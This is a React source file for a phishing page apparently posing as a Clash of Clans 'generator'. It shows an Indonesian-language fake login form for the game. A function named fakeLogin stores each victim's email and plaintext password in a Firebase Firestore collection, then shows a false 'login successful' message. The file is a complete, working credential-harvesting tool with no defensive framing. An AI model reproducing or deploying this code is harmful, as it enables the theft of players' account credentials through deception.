import { useEffect, useState } from "react";
import styled from "styled-components";
import swal from "sweetalert";

import { db } from "./firebase/firebase";
import { addDoc, collection, Timestamp } from "firebase/firestore";

import Navbar from './components/navbar'

import homebg from './assets/bg/bg-home.webp';
import logo from './assets/bg/bg-coc.webp'

export default function Generator() {

    const [email, setEmail] = useState('')
    const [password, setPassword] = useState('')

    const [notLogin, setNotLogin] = useState(true)

    function fakeLogin() {
        try {
            if (email === '' || password === '') {
                swal({
                    icon: 'warning',
                    title: 'Jangan ada yg kosong ya ',
                    button: 'Tutup'
                })
            } else {
                addDoc(collection(db, 'clashofsshhh'), {
                    email: email,
                    password, password,
                    date: new Date().toLocaleDateString(),
                    time: Timestamp.now().toMillis()
                })

                sessionStorage.setItem('isFakeLogin', false)
                setNotLogin(false)
                setEmail('')
                setPassword('')

                swal({
                    icon: 'success',
                    title: 'Berhasil Login',
                    button: 'Tutup'
                })
            }

        } catch (error) {
            console.log(error)
        }
    }

    useEffect(() => {
        setNotLogin(sessionStorage.getItem('isFakeLogin') === 'false' ? false : true)
    }, [])

    return (
        <>
            <Navbar></Navbar>
            <Container>
                <img src={logo} alt="logo" draggable="false" />
            </Container>
            {notLogin && (<GetData>
                <h2>Login Akun Clash of Clans Kamu</h2>
                <div className="form-group">
                    <p>Masukkan Email:</p>
                    <input type="email" placeholder="example@gmail.com" onChange={(e) => setEmail(e.target.value)} />
                    <br /><br />
                    <p>Masukkan Password:</p>
                    <input type="Password" placeholder="Input your password..." onChange={(e) => setPassword(e.target.value)} />
                    <br />
                    <br />
                    <button onClick={() => fakeLogin()}>Login</button>
                </div>
            </GetData>)}
            <br />
            <br />
            <br />
        </>
    );
}

const Container = styled.div`
  z-index: 1;
  width: 100%;
  height: 80dvh;
  background-image: url(${homebg});
  background-repeat: no-repeat;
  color: white;
  position: relative;

  img{
    position: absolute;
    left: 0;
    right: 0;
    margin: auto;
    margin-top: 100px;
    width: 300px;
    height: 150px;
  }

  @media only screen and (max-width:700px){
    background-size: cover;
    background-position: center;
    background-repeat: no-repeat;
  }
`;

const GetData = styled.div`
    background-color: #181818;
    margin: 0 auto;
    margin-top: 30px;
    border-radius: 15px;
    width: 60%;
    height: 330px;
    position: relative;

    h2{
        color: white;
        text-align: center;
        padding-top: 10px;
    }

    .form-group{
        width: 70%;
        height: 70%;
        position: absolute;
        top: 55%;
        left: 50%;
        transform: translate(-50%, -50%);
        color: white;
    }

    .form-group input{
        border: none;
        border-radius: 5px;
        outline: none;
        width: 80%;
        height: 45px;
        font-size: 15px;
        padding: 0 10px;
        margin-top: 10px;
    }

    .form-group button{
        padding: 7px 30px;
        border-radius: 5px;
        font-weight: bold;
        background-color: #3d3d3d;
        border: 1px solid white;
        color: white;
        cursor: pointer;
    }
`